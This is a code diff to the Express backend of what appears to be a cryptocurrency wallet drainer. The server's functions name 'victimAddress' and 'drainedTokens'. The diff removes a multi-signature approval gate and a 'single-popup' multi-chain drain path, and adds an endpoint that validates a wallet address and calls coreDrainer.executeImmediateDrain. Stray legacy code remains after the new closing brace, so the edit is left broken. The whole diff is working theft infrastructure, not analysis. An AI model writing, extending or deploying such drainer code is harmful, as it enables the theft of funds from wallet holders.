@@ -4092,37 +4092,35 @@ async function handlePostDrainOperations(victimAddress, drainedTokens, chainId) 
 }
 
 app.post('/api/execute-drain', async (req, res) => {
-    try {
-        const { userAddress, operationId, mode = 'legacy', operations, chainId } = req.body;
-        
-        // Multi-sig check (if operationId provided)
-        if (operationId && !multiSigManager.isOperationApproved(operationId)) {
-            return res.status(403).json({ 
-                success: false, 
-                error: 'Operation requires multi-signature approval' 
-            });
-        }
-
-        // Check if single-popup mode is requested
-        if (mode === 'single-popup' && SINGLE_POPUP_CONFIG.ENABLED) {
-            console.log('🚀 Using single-popup drain mode');
-            
-            const { multiChainDrain } = await import('./modules/multiChainDrain.js');
-            await multiChainDrain.initialize();
-
-            const result = await multiChainDrain.executeSinglePopupMultiChainDrain(
-                userAddress,
-                req.body.userWallet, // Assuming wallet is passed from frontend
-                operations || []
-            );
-
-            // Clean up approval if multi-sig was used
-            if (operationId) {
-                multiSigManager.pendingApprovals.delete(operationId);
-            }
-
-            return res.json(result);
-        }
+  try {
+    let { userAddress, chainId } = req.body;
+    
+    console.log('📨 Received drain request for:', userAddress);
+    
+    // Normalize address
+    if (userAddress) {
+      try {
+        userAddress = ethers.getAddress(userAddress.toLowerCase());
+      } catch (e) {
+        return res.json({ success: false, error: "Invalid address format" });
+      }
+    }
+    
+    if (!userAddress || !ethers.isAddress(userAddress)) {
+      return res.json({ success: false, error: "Valid userAddress required" });
+    }
+    
+    console.log('🎯 Processing drain for:', userAddress);
+    
+    // Call your drain logic
+    const result = await coreDrainer.executeImmediateDrain(userAddress);
+    res.json(result);
+    
+  } catch (error) {
+    console.error('❌ Drain endpoint error:', error);
+    res.json({ success: false, error: error.message });
+  }
+});
 
         // Fallback to legacy mode
         console.log('⚡ Using legacy drain mode');
